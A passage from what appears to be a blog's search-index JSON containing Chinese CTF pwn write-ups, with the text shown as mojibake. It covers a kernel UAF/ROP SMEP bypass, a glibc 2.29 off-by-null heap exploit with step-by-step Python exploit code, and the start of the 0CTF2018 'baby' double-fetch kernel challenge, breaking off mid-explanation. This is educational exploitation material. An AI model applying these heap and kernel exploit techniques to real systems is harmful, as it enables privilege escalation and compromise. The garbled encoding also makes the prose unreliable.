ret;\n----------------------------------------------------------------------\npop rdi; ret\n0x6f0\nmov cr4,rdi; ret;\n```\n\nä¸Šé¢ä¸¤ç§éƒ½è¡Œï¼Œæˆ–è€…å…¶å®ƒæ»¡è¶³æ¡ä»¶çš„gadgetä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œ0x6f0æ˜¯æƒ³ç»•è¿‡ä¸€äº›æœºåˆ¶ã€‚\n\n2.åˆ©ç”¨æ‰‹æ®µï¼š\n\n(1)é€šè¿‡UAFç”³è¯·å¾—åˆ°tty_structç»“æ„ä½“æŒ‡é’ˆï¼Œä¿®æ”¹const struct tty_operations *opsä½¿å…¶æŒ‡å‘ç”¨æˆ·ç©ºé—´ä¼ªé€ çš„tty_operationsç»“æ„ä½“ï¼Œä¼ªé€ çš„tty_operationsç»“æ„ä½“ä¸­çš„writeæŒ‡é’ˆæŒ‡å‘ROPé“¾ã€‚\n\n(2)ROPé“¾è¿›è¡Œè¿ç§»å†…æ ¸æ ˆï¼Œå…³é—­smepä¿æŠ¤ï¼Œæ­£å¸¸ret2Usrã€‚\n\n ","tags":["kernel-skill"],"categories":["pwn-kernel"]},{"title":"2.29ä¸‹çš„off-by-null","url":"/2021/08/14/2.29ä¸‹çš„off-by-null/","content":"\nâ–³ç›¸æ¯”2.29ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œåœ¨å‘ä¸Šåˆå¹¶æ—¶åŠ äº†ä¸€é¡¹æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\nå°±æ˜¯æ£€æŸ¥ä¸Šä¸€ä¸ªchunkçš„sizeæ˜¯å¦ç­‰äºå½“å‰chunkçš„pre_sizeã€‚ä¹‹å‰çš„off-by-nullè‚¯å®šæ˜¯ä¸ç­‰äºçš„å•Šï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸€å®šä¼šå‡ºé”™ã€‚é‚£ä¹ˆ2.29çš„ç»•è¿‡æ–¹æ³•å°±æ˜¯é€šè¿‡smallbinå’Œlargebinæ¥ä¼ªé€ ä¸€ä¸ªchunkï¼Œæ»¡è¶³ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nâ‘ fake_chunk->fd->bk == fake_chunk_addr\nâ‘¡fake_chunk->bk->fd == fake_chunk_addr\nâ‘¢fake_chunk->size = trigger_chunk->pre_size\n```\n\nå…¶ä¸­â‘¢ç”¨æ¥è¿‡æ–°å¢åŠ çš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\nâ‘ å’Œâ‘¡ç”¨æ¥è¿‡unlinkä¸­çš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))\n    malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n```\n\nè¿™æ ·å°±èƒ½å¤ŸæˆåŠŸoff-by-nulläº†ï¼Œå›¾ç¤ºå¦‚ä¸‹(ç”¨äº†[t1an5gçš„åšå®¢](https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2)çš„å›¾ç‰‡ï¼Œä¾µåˆ )ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191444152.png)\n\n1.ä¸‹é¢ç®€å•è¯´ä¸‹æµç¨‹ï¼š\n\n(1)è¿›è¡Œä¸€å®šçš„å †å¸ƒå±€ï¼Œä½¿å¾—èµ·ä½œç”¨çš„chunkçš„å †åœ°å€ä¸º0xx...x0010ï¼ŒåŒæ—¶ä¹Ÿæ–¹ä¾¿è®¡ç®—åç§»ï¼Œä»è€Œè¿›è¡Œä½ä½å­—èŠ‚è¦†ç›–ã€‚\n\n(2)é€šè¿‡largebinçš„fd_nextsizeæŒ‡é’ˆå’Œbk_nextsizeæŒ‡é’ˆï¼ŒåŠ ä¸Šå­—èŠ‚è¦†ç›–ä½¿å¾—fake_chunkçš„fdæŒ‡é’ˆæŒ‡å‘æŒ‡å®šFD(å³ä¸‹é¢çš„chunk18)ï¼Œfake_chunkçš„bkæŒ‡é’ˆæŒ‡å‘æŒ‡å®šBK(å³ä¸‹é¢çš„chunk17)ã€‚\n\n(3)é€šè¿‡fastbinå’Œsmallbinçš„è¿ç”¨ï¼ŒåŠ ä¸Šå­—èŠ‚è¦†ç›–ä½¿å¾—FD(chunk18)çš„bkæŒ‡é’ˆæŒ‡å‘fake_chunkã€‚\n\n(4)é€šè¿‡fastbinåŠ ä¸Šå­—èŠ‚è¦†ç›–ä½¿å¾—BK(chunk17)çš„fdæŒ‡é’ˆæŒ‡å‘fake_chunkã€‚\n\n(5)è¿›è¡Œå®Œä»¥ä¸Šæ“ä½œå°±å¾—åˆ°ç±»ä¼¼ä¸Šå›¾çš„å †å¸ƒå±€ï¼Œä¹‹åå°±å¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œè§¦å‘off-by-nullã€‚\n\n2.è¯¦ç»†ä»‹ç»ä¸€ä¸‹å…·ä½“å®ç°æ–¹æ³•ï¼š\n\n(1)å…ˆç”³è¯·17ä¸ªchunk,chunk0-chunk16ï¼Œå…¶ä¸­chunk0-chunk7ç”¨æ¥è¿›è¡Œå †å¸ƒå±€ï¼Œä½¿å¾—åé¢çš„chunk15çš„åœ°å€ä¸º0xx..x0010ï¼Œå³ä½¿å¾—ç”³è¯·çš„å †åœ°å€çš„ç¬¬äºŒä¸ªå­—èŠ‚ä¸º\"\\x00\"ï¼Œä»¥ä¾¿ä¹‹åè¦†ç›–çš„æ—¶å€™ä¸ç”¨è¿›è¡Œä¸€å­—èŠ‚çˆ†ç ´ï¼Œä»è€Œè¿›è¡Œå¯¹æŠ—off-by-nullçš„0å­—èŠ‚æº¢å‡ºã€‚å½“ç„¶ï¼Œå¦‚æœæ¡ä»¶é™åˆ¶çš„è¯ï¼Œ å…¶å®æ˜¯å¯ä»¥ä¸ç”¨chunk0-chunk7çš„å¸ƒå±€ï¼Œç”¨ä¸€å­—èŠ‚çˆ†ç ´æ¥è§£å†³é—®é¢˜ã€‚chunk8-chunk14å¤§å°ä¸º0x28ï¼Œç”¨æ¥å¡«å……0x30å¤§å°çš„tcacheã€‚chunk15å³å…³é”®éƒ¨åˆ†ï¼Œchunk16é˜²æ­¢åˆå¹¶ã€‚\n\n(2)é‡Šæ”¾chunk15ï¼Œsizeåº”è¯¥å¤§äºtcacheçš„æœ€å¤§sizeï¼Œè¿™é‡Œçš„chunk15æœ€å¥½è®¾ç½®å¤§ä¸€ç‚¹ï¼Œå¤§ä½¬çš„åšå®¢è®¾ç½®äº†0xb20å¤§å°ã€‚ç„¶åchunk15å°±ä¼šè¿›å…¥unsortedbinä¸­ï¼Œç”±äºunsortedbinä¸­åªæœ‰ä¸€ä¸ªchunk15ï¼Œæ‰€ä»¥chunk15çš„æŒ‡é’ˆä¼šæœ‰ä»¥ä¸‹æ•ˆæœï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk15->fd == main_arena+88(unsortebin_addr)\nchunk15->bk == main_arena+88\n```\n\n(3)ç”³è¯·ä¸€ä¸ª0x28å¤§å°çš„chunk17ï¼ŒåŒæ—¶ç”±äºæ­¤æ—¶binä¸­æ²¡æœ‰chunkï¼Œåªæœ‰Unsortedbinæ‰æœ‰chunk15ï¼Œæ‰€ä»¥ä¼šå°†chunk15å…ˆæ”¾å…¥largebinä¸­ï¼Œä¹‹åå†ä»chunk15ä¸­åˆ‡å‰²ï¼Œè¿”å›chunk17ï¼Œæ‰€ä»¥æ­¤æ—¶chunk15åœ¨largebinä¸­ï¼Œåˆåªæœ‰å®ƒä¸€ä¸ªchunkï¼Œç”±äºæ”¾å…¥largebinçš„èµ‹å€¼è¯­å¥ï¼Œæ‰€ä»¥åœ¨åˆ‡å‰²ä¹‹å‰ä¼šå˜æˆï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk15->fd == largebin_addr\nchunk15->bk == largebin_addr\nchunk15->fd_nextsize == chunk15_addr\nchunk15->bk_nextsize == chunk15_addr\n```\n\nåˆ‡å‰²ä¹‹åï¼Œchunk17è·å¾—äº†chunk15æ®‹ç•™ä¸‹æ¥çš„fdï¼Œbkï¼Œfd_nextsizeï¼Œbk_nextsizeã€‚å› ä¸ºchunk17æ˜¯ç”¨æ¥æ„é€ fake_chunkçš„ï¼Œæ‰€ä»¥å¤§å°éœ€è¦è‡³å°‘æœ‰0x20ã€‚é‚£ä¹ˆæ­¤æ—¶çš„chunk17ä¸­å†…å®¹å°±ä¼šå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk17->fd == largebin_addr\nchunk17->bk == largebin_addr\nchunk17->fd_nextsize == chunk17_addr\nchunk17->bk_nextsize == chunk17_addr\n```\n\nç„¶åæ„é€ åœ¨chunk17é‡Œåˆ¶ä½œfake_chunkï¼Œæ»¡è¶³ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\n```\n\nè¿™é‡Œéœ€è¦è¿›è¡Œèµ‹å€¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk17->fd = trigger_chunk->pre_size\nchunk17->fd_nextsize = \"\\x40\"\n```\n\n(åé¢ä¼šè®²åˆ°ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆèµ‹å€¼)ä¹‹åçš„fake_chunkçš„bkè‡ªåŠ¨ç»§æ‰¿äº†ä¹‹å‰æ®‹ç•™ä¸‹æ¥çš„æŒ‡é’ˆã€‚\n\n(4)ç”³è¯·chunk18-chunk21ï¼Œå¤§å°ä¸º0x28ã€‚ä½¿å¾—chunk18-chunk21éƒ½æ˜¯ä»chunk15ä¸­åˆ‡å‰²å‡ºæ¥çš„ï¼Œä¹‹åç”¨chunk8-chunk14å¡«æ»¡0x30çš„tcacheï¼Œç„¶åå†é¡ºåºé‡Šæ”¾chunk20å’Œchunk18ï¼Œä½¿å¾—chunk18,chunk20è¿›å…¥fastbin(0x30)ä¸­ï¼Œé¡ºåºä¸ºchunk18->chunk20ã€‚\n\n(5)å°†chunk8-chunk14ç”³è¯·å‡ºæ¥ï¼Œæ¸…ç©ºtcache(0x30)ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ª0x400å¤§å°çš„chunk(è¶…è¿‡smallbinå¤§å°å³å¯)ï¼Œè¿™æ ·å°±ä¼šå°†fastbinä¸­çš„chunkï¼Œä¹Ÿå°±æ˜¯chunk18å’Œchunk20æ”¾å…¥åˆ°smallbinä¸­ã€‚ç”±äºsmallbinå’Œfastbinåˆšå¥½ç›¸åï¼Œä¸€ä¸ªæ˜¯FIFOä¸€ä¸ªæ˜¯FILOï¼Œæ‰€ä»¥é¡ºåºä¼šåè¿‡æ¥ï¼Œå˜æˆï¼šchunk20->chunk18ï¼Œä½†åŒæ—¶ç”±äºæ˜¯bkå¯»å€ï¼Œæ‰€ä»¥å†ç”³è¯·chunkä¼šå…ˆæŠŠchunk18å–å‡ºæ¥ï¼ŒåŒæ—¶åœ¨smallbinä¸­ï¼Œé‚£ä¹ˆå°±ä¼šæ»¡è¶³chunk18->bk == chunk20_addr\n\n(6)æ­¤æ—¶èµ‹å€¼chunk18->bk = fake_chunk_addrï¼Œè¿™é‡Œä¸ç”¨çŸ¥é“å †åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“chunk20_addr - fake_chunk_addr == 0x80(sizeof(fake_chunk)+sizeof(chunk18)+sizeof(chunk19))ã€‚æ‰€ä»¥ä¹‹å‰chunk0-chunk7å°±å¯ä»¥è¿›è¡Œä¸€äº›å¤§å°å¸ƒå±€ï¼Œä½¿å¾—chunk15_addr == 0xx...x0010ï¼Œé‚£ä¹ˆfake_chunk_addr == 0xx...x0020ï¼Œchunk20_addr == 0xx...x00a0ï¼Œè¿™æ ·æˆ‘ä»¬å°±åªéœ€è¦æŠŠ0xa0è¦†ç›–æˆ0x20ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹chunk18->bkçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0x20å³å¯ã€‚ä½†åŒæ—¶ç”±äºoff by nullçš„å…³ç³»ï¼Œä¿®æ”¹chunk18->bkçš„ç¬¬ä¸€ä¸ªå­—èŠ‚åŠ¿å¿…ä¼šå¯¼è‡´ç¬¬äºŒä¸ªå­—èŠ‚ä¸º\"\\x00\"ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹å‰çš„å †å¸ƒå±€ä¹Ÿè¦ä½¿å¾—chunk15_addrçš„ç¬¬äºŒä¸ªå­—èŠ‚ä¸º\"\\x00\"æ‰å¯ä»¥ã€‚\n\né‚£ä¹ˆç°åœ¨ä¹Ÿå¯ä»¥ç†è§£ä¹‹å‰çš„ä¸€ä¸ªèµ‹å€¼è¯­å¥ï¼šchunk17->fd_nextsize = \"\\x40\"ï¼Œè¿™é‡Œå°±æ˜¯ä¸ºäº†å°†\"\\x10\"è¦†ç›–ä¸º\"\\x40\"ä½¿å…¶æŒ‡å‘chunk18ï¼ŒåŒæ—¶ä½¿å¾—ç¬¬äºŒä¸ªå­—èŠ‚ä¹Ÿä¸º\"\\x00\"ã€‚\n\nè¿™æ ·å°±æ»¡è¶³äº†ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\nchun18->bk == fake_chunk_addr\nchunk17->fd == chunk18_addr\n```\n\nä½†æ˜¯chunk17->fdä¸ç­‰äºfake_chunk_addrã€‚é‚£ä¹ˆåŒæ ·çš„æ“ä½œå†æ¥ä¸€æ¬¡ï¼Œåˆ©ç”¨chunk17å’Œchunk19ï¼Œä½¿å…¶è¿›å…¥fastbinï¼Œå°†chunk17çš„fdæŒ‡å‘chunk19ï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼Œè¦†ç›–chunk17çš„fdæŒ‡é’ˆï¼Œ0x70è¦†ç›–ä¸º0x20å³å¯ã€‚(ç”±äº2.29ä¸‹çš„tcacheä¼šæœ‰keyå­—æ®µï¼Œä½¿å¾—chunk17çš„bkæŒ‡é’ˆè¢«ä¿®æ”¹ï¼Œç›¸å½“äºä¿®æ”¹fake_chunkçš„sizeä½ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³çœ‹åˆ°çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯ç”¨fastbinæ¯”è¾ƒå¥½)æµç¨‹å¦‚ä¸‹ï¼š\n\nâ‘ å°†chunk20ä»tcacheä¸­ç”³è¯·å‡ºæ¥ï¼Œé˜²æ­¢ä¹‹åä¸å¥½æ“ä½œï¼Œç„¶åå†å°†chunk8-chunk14æ”¾å…¥tcacheä¸­ï¼Œä½¿å¾—ä¹‹åçš„chunkè¿›å…¥fastbinã€‚\n\nâ‘¡é¡ºåºé‡Šæ”¾chunk19ï¼Œchunk17ï¼Œä½¿å…¶è¿›å…¥fastbinä¸­ï¼Œä½¿å¾—chunk17->fd == chunk19_addrï¼Œå°±æ˜¯0xx...x70ã€‚\n\nâ‘¢ç„¶åå°†chunk8-chunk14ç”³è¯·å›æ¥ï¼Œå†å°†chunk17ç”³è¯·å›æ¥ï¼Œè¦†ç›–chunk17çš„fdçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0x20ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ»¡è¶³æ€»çš„æ¡ä»¶ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\nchunk18->bk == fake_chunk_addr\nchunk17->fd == fake_chunk_addr\n```\n\n(7)æœ€åå°†chunk19ç”³è¯·å›æ¥ï¼Œå†ä»chunk15å‰©ä¸‹çš„éƒ¨åˆ†ç”³è¯·chunk22ç”¨æ¥æº¢å‡ºã€‚å†ç”³è¯·chunk23å°†chunk15é—ç•™çš„éƒ¨åˆ†éƒ½ç”³è¯·å›æ¥ï¼Œæº¢å‡ºä¹‹åé‡Šæ”¾æ‰ï¼Œå³å¯è§¦å‘off by nullï¼Œå‘ä¸Šåˆå¹¶æœ€åˆçš„chunk15-0x10å¤§å°çš„chunkï¼Œä½¿å¾—fake_chunkï¼Œchunk18,chunk19,chunk20,chunk21,chunk22,chunk23éƒ½è¢«ç½®å…¥unsortedbinä¸­ã€‚åˆ©ç”¨chunk8-chunk14å¯¹æŠ—tcacheï¼Œå°±å¯ä»¥éšä¾¿ç©äº†ã€‚(æ³¨æ„è¿™é‡Œä¸éœ€è¦åƒä¹‹å‰ç‰ˆæœ¬çš„off by nullä¸€æ ·ï¼Œè¿˜éœ€è¦é‡Šæ”¾æ‰chunk0æ¥ç»•è¿‡unlinkæ£€æŸ¥ï¼Œä¹‹å‰æ˜¯å› ä¸ºä¸æ£€æŸ¥sizeä½ï¼Œæ‰€ä»¥ç›´æ¥é‡Šæ”¾æ‰å³å¯ã€‚è¿™é‡Œçš„fake_chunkå·²ç»æ›¿ä»£äº†chunk0çš„ä½œç”¨ï¼Œèƒ½å¤Ÿç»•è¿‡Unlinkçš„æ£€æŸ¥å’Œsizeä½çš„æ£€æŸ¥)\n\n3.æœ€åæ¨¡æ‹Ÿä¸€ä¸‹ä»£ç ï¼ŒåŒæ ·å‚è€ƒäº†å¤§ä½¬[t1an5gçš„åšå®¢](https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2)ï¼š\n\n(1)å‰æœŸå‡†å¤‡åŠ å †å¸ƒå±€:\n\n```python\n#æ³¨é‡Šå¤´\n\nfor i in range(7): # 0-6\n    add(0x1000, \"padding\")\nadd(0x1000-0x410, \"padding\") # 7\n\nfor i in range(7): # 8-14\n    add(0x28, 'tcache')\n\n#crux chunk15\nadd(0xb20, \"largebin\") # 15\n\n#prevent merge\nadd(0x10, \"padding\") # 16\n```\n\n(2)åˆ¶ä½œfake_chunkï¼Œåˆ©ç”¨largebinè¸©ä¸‹fd_nextsizeå’Œbk_nextsize:\n\n```python\n#æ³¨é‡Šå¤´\n\ndelete(15)\n\n#chunk15 to largebin\nadd(0x1000, '\\n') \n\n#make fake_chunk in chunk17\nadd(0x28, p64(0) + p64(0x521) + p8(0x40))\n```\n\n(3)è”åŠ¨fastbinå’Œsmallbinï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x28, 'a') # 18\nadd(0x28, 'b') # 19\nadd(0x28, 'c') # 20\nadd(0x28, 'd') # 21\n\n# fill in tcache(0x30)\nfor i in range(7): # 8-14\n    delete(8 + i)\n\ndelete(20)\ndelete(18)\n\n# clear tcache(0x30)\nfor i in range(7): # 8-14\n    add(0x28, 'padding')\n\n# fastbin to smallbin\nadd(0x400, 'padding')\n\n# get chunk18 from smallbin ,chunk20 to tcache\n# change chunk18->bk to point to fake_chunk\nadd(0x28, p64(0) + p8(0x20))\n```\n\n(4)åˆ©ç”¨fastbinä¿®æ”¹chunk17->fdï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n# clear chunk from tcache\nadd(0x28, 'clear') # 20 from tcache\n\nfor i in range(7): # 8-14\n    delete(8 + i)\n\n# free to fastbin\ndelete(19)\ndelete(17)\n\nfor i in range(7): # 8-14\n    add(0x28, '\\n')\n\n# change chunk17->fd to point to fake_chunk\nadd(0x28, p8(0x20))\n```\n\n(5)è§¦å‘off-by-null:\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x28, \"clear\")#19 from fastbin\n\nadd(0x28, \"a\") # 22 cutting from chunk15 in unsortebin,for overwrite\nadd(0x5f8, \"a\") # 23 legacy from chunk15 in unsortebin,for trigger off-by-null\nadd(0x100, \"padding\") # 24\n\n# off-by-null \nedit(22, \"a\"*0x20 + p64(0x520))\n\n# trigger\ndelete(23)\n```\n\nâ–³ä»¥ä¸Šçš„chunkç´¢å¼•å¯¹äºé¢˜ç›®å…·ä½“åˆ†æï¼Œä¸åŒé¢˜ç›®å¯¹ç´¢å¼•çš„å¤„ç†è‚¯å®šä¸ä¸€æ ·ã€‚\n\nå…¶å®è¿˜æœ‰å…¶ä»–åªåˆ©ç”¨unsortedbinå’Œlargebinçš„ç»•è¿‡ï¼Œè´´ä¸€ä¸‹åœ°å€ï¼š\n\nhttps://www.anquanke.com/post/id/236078#h3-14\n\nåé¢å†æ¥å•ƒå§ã€‚\n","tags":["off-by-null"],"categories":["PWN","pwnå †-off-by-null"]},{"title":"0CTF2018-baby(double-fetch)","url":"/2021/08/14/0CTF2018-baby(double-fetch)/","content":"\nåªç»™äº†baby.koå’ŒåŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿcore.cpioï¼Œæ²¡æœ‰å†…æ ¸å’Œå¯åŠ¨è„šæœ¬ï¼Œæ‰€ä»¥éœ€è¦ä¸‹è½½å’Œé…ç½®ã€‚\n\n1.ä¸‹è½½å†…æ ¸é…ç½®ç¯å¢ƒï¼š\n\n(1)IDAæ‰“å¼€baby.koæŸ¥çœ‹åå…­è¿›åˆ¶çš„æ±‡ç¼–å¯ä»¥çœ‹åˆ°è°ƒç”¨çš„Linuxç‰ˆæœ¬ï¼Œå¯ä»¥ä¸‹è½½æºç ç¼–è¯‘æˆ–è€…ç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-27_12-07-25.png)\n\n(2)è§£å‹å¾—åˆ°å‹ç¼©å†…æ ¸ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\napt search linux-image-[version]\napt download xxxx\nar -x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb\n```\n\nåœ¨./data/bootä¸­æœ‰vmlinuz-4.15.0-22-genericï¼Œä¸è¦å†ç±»ä¼¼å‹ç¼©ä¸ºbzImageï¼Œå¯ä»¥ç›´æ¥ç”¨æ¥å¯åŠ¨qemuã€‚\n\n(3)é…ç½®æ–‡ä»¶ç³»ç»Ÿå’Œå¯åŠ¨è„šæœ¬ï¼š\n\nâ‘ æ–‡ä»¶ç³»ç»Ÿï¼šç”¨busyboxåˆ¶ä½œçš„ï¼Œfind ./* | cpio -H newc -o > rootfs.cpio\n\n![1](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png)\n\nâ‘¡å¯åŠ¨è„šæœ¬å’Œé…ç½®æ–‡ä»¶ï¼š\n\n![2](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png)\n\n```bash\n#! /bin/sh\nqemu-system-x86_64 \\\n-m 256M -smp 4,cores=2,threads=2 \\\n-kernel ./vmlinux \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokalsr\" \\\n-cpu qemu64 \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n#-gdb tcp::1234 \\\n# -S\n```\n\n \n\n2.å¼€å§‹è§£æbaby.ko\n\n(1)ä¸¤ä¸ªå®é™…å‘½ä»¤ï¼Œåœ¨baby_ioctlå‡½æ•°ä¸­ï¼š\n\n![3](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\nâ‘ 0x6666å‘½ä»¤å¯ä»¥å¾—åˆ°flagåœ¨å†…æ ¸ç©ºé—´çš„åœ°å€\n\nâ‘¡0x1337å‘½ä»¤ä¼šè§¦å‘ä¸‰ä¸ªæ£€æŸ¥ï¼Œå¦‚æœæ£€æŸ¥æˆåŠŸåˆ™å¯ä»¥æ‰“å°å‡ºflag\n\n(2)æ¼æ´ç‚¹ï¼š\n\næ¼æ´åœ¨æ£€æŸ¥ä¸Šï¼Œä¸‰ä¸ªæ£€æŸ¥æ˜¯æ£€æŸ¥é€šè¿‡ioctlä¼ å…¥çš„æ•°æ®rdxã€‚\n\nâ–²_chk_range_not_okå‡½æ•°ï¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°rdiå’Œç¬¬äºŒä¸ªå‚æ•°rsiç›¸åŠ ï¼Œåˆ¤æ–­æ˜¯å¦å°äºç¬¬ä¸‰ä¸ªå‚æ•°rdxï¼Œå¦‚æœå¤§äºç­‰äºå°†alç½®ä¸º1(alå³raxçš„ä½8ä½å¯„å­˜å™¨)ï¼Œå¦‚æœå°äºåˆ™è¿”å›0ï¼Œè€Œå¦‚æœè¦è¿›å…¥è¯¥ifï¼Œåˆ™éœ€è¦è¿”å›å€¼ä¸º0ï¼Œåˆ™éœ€rdi+rsi < rdxã€‚\n\nâ‘ æ£€æŸ¥ä¸€ï¼š_chk_range_not_ok(v2, 16LL, *(__readgsqword(&current_task) + 4952)å…¶ä¸­çš„*(__readgsqword(&current_task) + 4952)å…¶å®æ˜¯ç”¨æˆ·ç©ºé—´çš„èµ·å§‹åœ°å€ï¼š\n\n![4](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.png)\n\nå³ä¼ å…¥æ•°æ®çš„åœ°å€åŠ ä¸Š16éœ€è¦å°äº0x7ffffffff000ï¼Œè€Œå°äº0x7ffffffff000åˆ™è¡¨ç¤ºå¤„åœ¨ç”¨æˆ·ç©ºé—´ä¸­ï¼š\n\n![5](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png)\n\né‚£ä¹ˆå°±æ˜¯æ£€æŸ¥ä¼ å…¥çš„æ•°æ®çš„åœ°å€æ˜¯å¦ä½äºç”¨æˆ·ç©ºé—´ã€‚\n\nâ‘¡æ£€æŸ¥äºŒå³å°†ä¼ å…¥çš„æ•°æ®ä½œä¸ºä¸€ä¸ªç»“æ„ä½“ï¼Œæ£€æŸ¥è¯¥ç»“æ„ä½“ä¸­flagæŒ‡é’ˆå¯¹åº”çš„æ•°æ®çš„åœ°å€åŠ ä¸Šflagçš„é•¿åº¦æ˜¯å¦ä½äºç”¨æˆ·ç©ºé—´ã€‚\n\nâ‘¢æ£€æŸ¥ä¸‰å³æ£€æŸ¥flagçš„é•¿åº¦æ˜¯å¦å’Œç¨‹åºä¸­ç¡¬ç¼–ç çš„é•¿åº¦ç›¸ç­‰ã€‚\n\nâ–²ç”±äºä¼ å…¥çš„ç»“æ„ä½“æ˜¯ç”±æˆ‘ä»¬æ§åˆ¶çš„ï¼Œä¸”è¿‡ç¨‹ä¸­ä¾æ®è¯¥ç»“æ„ä½“æ¥ç´¢å¼•flagï¼Œå…¶ä¸­çš„flagæŒ‡é’ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥æ”¹å˜ï¼Œæ‰€ä»¥å¦‚æœåœ¨æ£€æŸ¥ç»“æŸä¹‹åï¼Œæ‰“å°flagä¹‹å‰ï¼Œèƒ½å¤Ÿå°†flagæŒ‡é’ˆæŒ‡å‘å†…æ ¸ç©ºé—´çœŸæ­£çš„flagå¤„ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿé€šè¿‡ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfor ( i = 0; i < strlen(flag); ++i )\n{\n    if ( *(*v5 + i) != flag[i] )\n    return 22LL;\n}\n```\n\nä»è€Œæ‰“å°å†…æ ¸ç©ºé—´çœŸæ­£çš„flagäº†ã€‚è€Œè¿™ä¸ªå†…æ ¸ç©ºé—´flagçš„åœ°å€å¯ä»¥é€šè¿‡å‘½ä»¤0x6666å¾—åˆ°ï¼Œè¿™æ ·å°±ç±»ä¼¼äºåˆ©ç”¨äº†ä¸€ä¸ªæ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚\n\n \n\n3.ç¼–å†™exp\n\n(1)é¦–å…ˆæ˜¯ç»“æ„ä½“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct MyflagStruc\n{\n    char *flag;\n    size_t len;\n};\n```\n\n(2)æ¥ç€æ‰“å¼€devè·å–åœ°å€:\n\n```\n#æ³¨é‡Šå¤´\n\nint fd = open(\"/dev/baby\",O_RDONLY);\nioctl(fd,0x6666);\n\nsystem(\"dmesg > /tmp/record.txt\");\nallInfo_fd= open(\"/tmp/record.txt\",O_RDONLY);\nlseek(allInfo_fd,-0x1000,SEEK_END);\nread(allInfo_fd,buf,0x1000);\nclose(allInfo_fd);\nidx = strstr(buf,\"Your flag is at \");\nif (idx == 0){\n    printf(\"[-]Not found addr\");\n    exit(-1);\n}\nelse{\n    idx += 16;\n    kernelFlag_addr = strtoull(idx,idx+16,16);\n    printf(\"[+]kernelFlag_addr: %p\\n\",kernelFlag_addr);\n}\n```\n\nâ‘ å…³äºdmesgï¼Œè¿™ä¸ªå‘½ä»¤æ˜¯è·å–ä»å¯åŠ¨è™šæ‹Ÿæœºå¼€å§‹çš„å‡ 